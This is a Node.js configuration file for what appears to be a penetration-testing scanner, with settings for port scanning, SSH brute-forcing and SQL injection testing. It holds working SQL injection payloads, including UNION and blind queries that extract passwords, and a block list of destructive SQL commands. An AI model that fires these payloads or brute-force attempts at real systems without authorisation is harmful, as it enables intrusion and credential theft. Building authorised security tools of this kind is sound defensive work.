// src/config/index.js
require('dotenv').config();

const config = {
    port: process.env.PORT || 3000,
    nvd: {
        apiKey: process.env.NIST_API_KEY,
        baseUrl: 'https://services.nvd.nist.gov/rest/json/cves/2.0',
    },
    scan_timeouts: {
        tcp: { 1: 5000, 2: 2500, 3: 1250, 4: 500, 5: 250 },
        udp: { 1: 3000, 2: 2000, 3: 1500, 4: 1000, 5: 500 },
        banner: 2000,
        postgres: 2000,
        http: 2000,
    },
    scan_limits: {
        tcpConcurrency: parseInt(process.env.SCAN_TCP_CONCURRENCY || '200', 10),
        udpConcurrency: parseInt(process.env.SCAN_UDP_CONCURRENCY || '50', 10),
        hostDiscoveryConcurrency: parseInt(process.env.SCAN_HOST_DISCOVERY_CONCURRENCY || '255', 10),
    },
    
    // Configurazione SSH Brute-Force
    ssh_tool: {
        port: parseInt(process.env.SSH_TOOL_PORT || '3001', 10),
        rate_limit_delay: parseInt(process.env.SSH_RATE_LIMIT_DELAY || '750', 10),
        connection_timeout: parseInt(process.env.SSH_CONNECTION_TIMEOUT || '8000', 10),
        max_concurrent_connections: parseInt(process.env.SSH_MAX_CONCURRENT_CONNECTIONS || '5', 10),
        log_dir: process.env.SSH_LOG_DIR || './logs/ssh',
        audit_log_path: process.env.SSH_AUDIT_LOG_PATH || './logs/ssh/ssh_audit.log',
        error_log_path: process.env.SSH_ERROR_LOG_PATH || './logs/ssh/ssh_errors.log',
        algorithms: {
            kex: [
                'curve25519-sha256@libssh.org',
                'ecdh-sha2-nistp384',
                'ecdh-sha2-nistp521',
                'diffie-hellman-group-exchange-sha256',
                'diffie-hellman-group16-sha512'
            ],
            serverHostKey: [
                'ssh-ed25519',
                'ecdsa-sha2-nistp521',
                'rsa-sha2-512',
                'rsa-sha2-256'
            ],
            cipher: [
                'chacha20-poly1305@openssh.com',
                'aes256-gcm@openssh.com',
                'aes128-gcm@openssh.com',
                'aes256-ctr',
                'aes192-ctr',
                'aes128-ctr'
            ],
            hmac: [
                'hmac-sha2-256-etm@openssh.com',
                'hmac-sha2-512-etm@openssh.com'
            ]
        },
        error_patterns: {
            'All configured authentication methods failed': 'Credenziali errate',
            'Connection timed out': 'Timeout connessione',
            'Handshake failed': 'Handshake SSH fallito',
            'ECONNREFUSED': 'Connessione rifiutata dal server',
            'EHOSTUNREACH': 'Host non raggiungibile',
            'Network is unreachable': 'Rete non raggiungibile',
            'Permission denied': 'Permesso negato',
            'Too many authentication failures': 'Troppi tentativi di autenticazione',
            'Host key verification failed': 'Verifica chiave host fallita'
        },
        security: {
            max_attempts_per_session: parseInt(process.env.SSH_MAX_ATTEMPTS_PER_SESSION || '1000', 10),
            session_timeout: parseInt(process.env.SSH_SESSION_TIMEOUT || '3600000', 10),
            require_secure_connection: process.env.SSH_REQUIRE_SECURE_CONNECTION === 'true',
            log_all_attempts: process.env.SSH_LOG_ALL_ATTEMPTS !== 'false'
        }
    },
    
    // Configurazione Network Mapping
    network_mapping: {
        default_timeout: parseInt(process.env.NETWORK_MAP_TIMEOUT || '5000', 10),
        max_concurrent_hosts: parseInt(process.env.NETWORK_MAP_CONCURRENT_HOSTS || '50', 10),
        port_scan_timeout: parseInt(process.env.PORT_SCAN_TIMEOUT || '2000', 10)
    },

    // Configurazione SQL Injection
    sql_injection: {
        timeout: parseInt(process.env.SQL_INJECTION_TIMEOUT || '10000', 10),
        max_concurrent_scans: parseInt(process.env.SQL_INJECTION_MAX_CONCURRENT || '3', 10),
        safe_mode: process.env.SQL_INJECTION_SAFE_MODE !== 'false',
        user_agent: process.env.SQL_INJECTION_USER_AGENT || 'DeimosSecurityScanner/1.0',
        rate_limit: {
            windowMs: parseInt(process.env.SQL_INJECTION_RATE_LIMIT_WINDOW || '60000', 10),
            max: parseInt(process.env.SQL_INJECTION_RATE_LIMIT_MAX || '30', 10)
        },
        payloads: {
            basic: [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin'--"
            ],
            union: [
                "' UNION SELECT null,username,password FROM users--",
                "' UNION SELECT 1,@@version,3--"
            ],
            error: [
                "' AND 1=CONVERT(int,@@version)--",
                "' AND 1=1/0--"
            ],
            time: [
                "' OR IF(1=1,SLEEP(5),0)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))--"
            ],
            blind: [
                "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"
            ]
        },
        destructive_patterns: [
            'DROP TABLE',
            'DELETE FROM',
            'TRUNCATE TABLE',
            'xp_cmdshell',
            'SHUTDOWN'
        ]
    }
};

module.exports = config;